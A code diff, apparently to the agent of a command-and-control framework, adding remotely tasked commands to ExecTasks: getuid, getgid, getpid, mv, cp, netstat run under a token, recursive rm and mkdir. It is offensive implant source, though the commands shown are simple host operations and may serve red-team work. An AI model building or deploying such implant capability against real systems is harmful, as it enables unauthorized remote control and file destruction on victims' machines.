@@ -179,8 +179,77 @@ func ExecTasks(tasksToDo []string, sleep *int, agentid string, useragent string,
 			}
 		case "died":
 			data = "died"
-		case "":
+		case "getuid":
+			data, _ = hg.GetCurrentUid()
+		case "getgid":
+			data, _ = hg.GetCurrentGid()
+		case "getpid":
+			data = fmt.Sprint(hg.GetCurrentPid())
+		case "mv":
+			taskDataSplit := strings.Split(taskData, " -- ")
+			source := taskDataSplit[0]
+			dest := taskDataSplit[1]
 
+			err := hg.MoveFile(source, dest)
+			if err != nil {
+				data = err.Error()
+				break
+			}
+
+			data = "moved file"
+		case "cp":
+			taskDataSplit := strings.Split(taskData, " -- ")
+			source := taskDataSplit[0]
+			dest := taskDataSplit[1]
+
+			err := hg.CopyFile(source, dest)
+			if err != nil {
+				data = err.Error()
+				break
+			}
+
+			data = "copied file"
+		case "netstat":
+			data, _ = hg.PsReturnT("netstat -ano", TokenLinked)
+		case "rm":
+			file, err := os.Open(taskData)
+			if err != nil {
+				data = err.Error()
+				break
+			}
+
+			defer file.Close()
+
+			fileInfo, err := file.Stat()
+			if err != nil {
+				data = err.Error()
+				break
+			}
+
+			// IsDir is short for fileInfo.Mode().IsDir()
+			if fileInfo.IsDir() {
+				err := hg.DeleteDir(taskData)
+				if err != nil {
+					data = err.Error()
+					break
+				}
+			} else {
+				err := hg.DeleteFile(taskData)
+				if err != nil {
+					data = err.Error()
+					break
+				}
+			}
+
+			data = "removed file"
+		case "mkdir":
+			err := hg.NewDir(taskData)
+			if err != nil {
+				data = err.Error()
+				break
+			}
+
+			data = "ccreated directory"
 		default:
 			data = "command not supported"
 		}
